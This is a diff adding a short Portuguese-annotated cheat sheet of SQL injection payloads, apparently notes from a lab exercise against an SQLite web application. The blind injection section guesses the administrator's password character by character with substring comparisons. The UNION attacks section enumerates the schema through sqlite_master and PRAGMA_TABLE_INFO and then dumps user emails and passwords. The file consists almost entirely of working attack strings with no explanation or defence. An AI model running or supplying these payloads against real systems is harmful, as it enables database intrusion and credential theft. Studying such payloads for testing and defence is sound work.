@@ -1,0 +1,26 @@
+####### SQL Injection #######
+
+####### Blind SQL Injection #######
+
+AND 1 = 1
+AND 1 = 2
+UNION SELECT 1 FROM teste_tabela --
+UNION SELECT 1 FROM usuario -- erro colunas
+UNION SELECT 1, 1, 1, 1, 1, 1 FROM usuario -- sucesso
+UNION SELECT 1, 1, 1, 1, 1, 1 FROM usuario WHERE teste_coluna = 1 --
+UNION SELECT 1, 1, 1, 1, 1, 1 FROM usuario WHERE id = 1 --
+UNION SELECT 1, 1, 1, 1, 1, 1 FROM usuario WHERE senha = 1 --
+UNION SELECT 1, 1, 1, 1, 1, 1 FROM usuario WHERE nome = 1 --
+UNION SELECT 1, 1, 1, 1, 1, 1 FROM usuario WHERE nome = 'Administrador' AND substr(senha, 1, 1) > "a" --
+UNION SELECT 1, 1, 1, 1, 1, 1 FROM usuario WHERE nome = 'Administrador' AND substr(senha, 2, 2) > "f" --
+UNION SELECT 1, 1, 1, 1, 1, 1 FROM usuario WHERE nome = 'Administrador' AND substr(senha, 2, 2) < "f" --
+
+####### UNION Attacks #######
+
+pesquisa' UNION SELECT 1, 2 --
+pesquisa' UNION SELECT 1, 2, 3, 4, 5, 6 --
+pesquisa' UNION SELECT sql, name, sql, name, sql, name FROM sqlite_master --
+pesquisa' UNION SELECT name, name, name, name, name , name FROM PRAGMA_TABLE_INFO('comentario') --
+pesquisa' UNION SELECT texto, id_usuario, texto, id_usuario, texto, id_usuario FROM comentario --
+pesquisa' UNION SELECT name, name, name, name, name , name FROM PRAGMA_TABLE_INFO('usuario') --
+pesquisa' UNION SELECT email, senha, email, senha, email, senha FROM usuario --
